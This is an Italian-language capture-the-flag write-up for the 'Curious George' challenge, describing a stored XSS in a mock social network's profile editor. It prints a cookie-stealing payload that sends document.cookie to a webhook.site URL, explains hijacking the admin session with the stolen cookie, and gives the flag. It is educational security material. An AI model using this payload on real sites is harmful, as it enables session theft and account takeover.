# Writeup: Curious George

## Descrizione 📝
La challenge presenta un nuovo social network chiamato **Curious George** che offre numerose funzionalità, ma nasconde una vulnerabilità XSS nella sezione "Edit Profile". L'utente non admin non dovrebbe poter accedere ad alcune funzionalità, come modificare il profilo di altri, ma il sito espone un parametro (es. `id=7`) che, se manomesso, mostra il messaggio "Hey?! Non sei un admin. Cosa stai cercando di fare?".

L'obiettivo è sfruttare una vulnerabilità XSS per esfiltrare il cookie dell'admin. Per completare la challenge è inoltre richiesto un proof of work, che dura circa 1 minuto; tale operazione può essere automatizzata tramite lo script fornito dalla challenge.

## Sfruttamento 🎯

1. **Identificazione della Vulnerabilità**  
   Analizzando la dashboard e la pagina "Edit Profile", è stato riscontrato che il campo di input non filtra correttamente il codice HTML/JavaScript.  
   Ad esempio, inserendo un payload come:
   ```html
   <script>alert(1)</script>
   ```
   la pagina esegue lo script, confermando la presenza di una vulnerabilità XSS.

2. **Inserimento del Payload XSS**  
   Per esfiltrare il cookie dell'admin, è stato deciso di utilizzare un payload che invia il cookie a un endpoint di Webhook.  
   Il payload inserito nel campo di input della sezione "Edit Profile" era:
   ```html
   <img src="image.png" onerror="fetch('https://webhook.site/820487ad-3d80-4ab5-9c67-9a7912109b16?flag='+document.cookie)">
   ```
   Questo payload sfrutta l'evento `onerror` del tag `<img>`. Quando l'immagine non viene caricata, l'errore genera l'esecuzione del codice JavaScript che esegue un `fetch()` verso il nostro Webhook, allegando il cookie dell'admin alla query string.

3. **Invio del Report all'Admin**  
   Dopo aver inserito il payload nella sezione "Edit Profile", è stato inviato un URL di report all'admin. Quando l'admin ha visitato il link, il payload XSS si è eseguito nel suo browser e il suo cookie è stato esfiltrato tramite il Webhook.

4. **Modifica del Cookie e Accesso come Admin**  
   Una volta ottenuto il cookie dell'admin, è stato possibile sostituirlo con il proprio cookie per ottenere privilegi amministrativi e visualizzare la flag.

## Flag 🏁
```
flag{c00ki3s_4r3_d4Ng3r0uS_Wh3n_Th3y_m33t_XSS}
```

## Lezioni Apprese 📚
1. **XSS Riflesso e Persistente**: L'iniezione di codice nei campi di input può essere sfruttata per esfiltrare dati sensibili, come i cookie, soprattutto se non vengono applicate opportune tecniche di sanitizzazione.
2. **Manipolazione dei Cookie**: La sostituzione del cookie dell'admin con quello esfiltrato permette di bypassare i controlli di accesso.
3. **Utilizzo di Webhook**: Strumenti come Webhook.site sono estremamente utili per catturare e analizzare richieste HTTP e dati esfiltrati.

## Tools Utilizzati 🛠️
- **Browser DevTools**: Per esaminare il codice sorgente della pagina e testare il payload XSS.
- **Burp Suite**: Per intercettare e modificare le richieste HTTP e visualizzare i parametri.
- **Webhook.site**: Per ricevere il cookie esfiltrato dall'esecuzione del payload XSS.

---

*Writeup by Luca Crippa - Last Updated: 2024*
